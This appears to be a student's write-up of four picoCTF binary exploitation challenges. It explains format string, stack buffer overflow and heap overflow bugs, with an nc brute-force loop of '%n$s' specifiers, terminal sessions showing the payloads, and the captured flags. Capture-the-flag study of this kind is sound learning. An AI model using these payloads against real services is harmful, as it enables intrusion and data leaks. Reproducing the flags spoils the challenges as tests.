# Binary Exploitation - Mandatory Challenges

## flag leak

We have a `format string vulnerability` on `vuln` function by calling to `printf(story)`, using which we can leak the string of the flag from the stack but we don't know its location on the stack.

![image](https://github.com/user-attachments/assets/1126895c-a093-4131-a56c-fc98d942a3da)

command used:

```
for n in {1..100}; do echo "%${n}\$s" | nc saturn.picoctf.net 59386; done
```

![image](https://github.com/user-attachments/assets/84ddc4ee-c30b-49b7-9aef-a6face170d3a)
![image](https://github.com/user-attachments/assets/477a4ae5-930c-4684-96fe-fb29cf735edd)

Found the flag

**Flag:**

```
picoCTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}
```

**References used:**
- https://www.geeksforgeeks.org/format-string-vulnerability-and-prevention-with-example/
- https://en.wikipedia.org/wiki/Uncontrolled_format_string

## format string 0

**Approach: Brute Force**

Initially, I tried to brute force the challenge and was successful. I found the flag quickly and easily and then analyzed the given code afterwards.

The brute-force method allowed me to navigate through the challenge effectively. By testing the inputs given in the program, I successfully retrieved the flag. 
 
For `Patrick`, I started with the burger names from the menu. I noticed that the system accepted the input `Gr%114d_Cheese`, which triggered a format string vulnerability.

For `Sponge Bob`, the second customer, I continued with the same method, testing all the provided burger names, the input `Cla%sic_Che%s%steak` was accepted, which also exhibited format string behavior.
Thus, I received the flag.

**Knowledge Gained:**

Format Strings- Learnt how format strings can be used to manipulate the output. The %s and other format specifiers can be exploited to read from the stack.

```
root@DhruvsPC:~# nc mimas.picoctf.net 52258
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Breakf@st_Burger
Breakf@st_BurgerPatrick is still hungry!
Try to serve him something of larger size!
^Z
[1]+  Stopped                 nc mimas.picoctf.net 52258
root@DhruvsPC:~# nc mimas.picoctf.net 52258
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Pe%to_Portobello
Pe20021560_Portobello
root@DhruvsPC:~# nc mimas.picoctf.net 52258
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: $outhwest_Burger
$outhwest_Burger
root@DhruvsPC:~# nc mimas.picoctf.net 52258
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}

```

**Flag:**

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}
```

**Resources Used:**

https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/


## buffer overflow 0

**Approach: Exploit a simple buffer overflow vulnerability**

We need to overflow a buffer in order to trigger a segmentation fault (SIGSEGV) and get the flag.

**Vulnerability:**

strcpy function:

```
void vuln(char *input){
    char buf2[16];
    strcpy(buf2, input);
}
```

`strcpy` is used here to copy `input` into `buf2`, which has a fixed size of 16 characters. If `input` exceeds 16 characters, it will cause a buffer overflow. `input` ,i.e , `buf1` has a max size of 100 bytes/characters.

Signal Handler for SIGSEGV:

```
void sigsegv_handler(int sig) {
    printf("%s\n", flag);
    fflush(stdout);
    exit(1);
}
```

If a segmentation fault occurs (e.g., due to a buffer overflow), this handler will execute, printing the flag.

**Approach:**

Overflow `buf2` in `vuln` function by passing in more than 16 characters, causing a segmentation fault and thereby triggering the `sigsegv_handler` function, which will print the flag.

It should have worked with 17, 18 or 19 characters since we only needed more than 16 characters to trigger a buffer overflow, but it didn't get triggered. It finally overflowed when I inputted 20 or more characters. Upon researching the cause for this, I found out that this behaviour might be due to some kind of "extra buffer"/padding or memory alignment.

```
root@DhruvsPC:~# nc saturn.picoctf.net 59644
Input: 1234567890123456789
The program will exit now
^Z
[1]+  Stopped                 nc saturn.picoctf.net 59644
root@DhruvsPC:~# nc saturn.picoctf.net 59644
Input: 12345678901234567890
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

**Flag:**

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

# Binary Exploitation - Extra Challenges

## heap 0

**Approach: Exploit heap overflow vulnerability**

We need to modify `safe_var` to a value other than `"bico"` so that the `check_win()` function will print the flag.

Since both `input_data` and `safe_var` are allocated close to each other on the heap, if we overflow `input_data`, it will spill over into `safe_var`, allowing us to modify its contents.

```
Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x62ca8e36f2b0  ->   pico
+-------------+----------------+
[*]   0x62ca8e36f2d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: 1234567890123456789012345678901234567890

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x62ca8e36f2b0  ->   1234567890123456789012345678901234567890
+-------------+----------------+
[*]   0x62ca8e36f2d0  ->   34567890
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_4fa6dd49}

```

**Flag:**

```
picoCTF{my_first_heap_overflow_4fa6dd49}
```
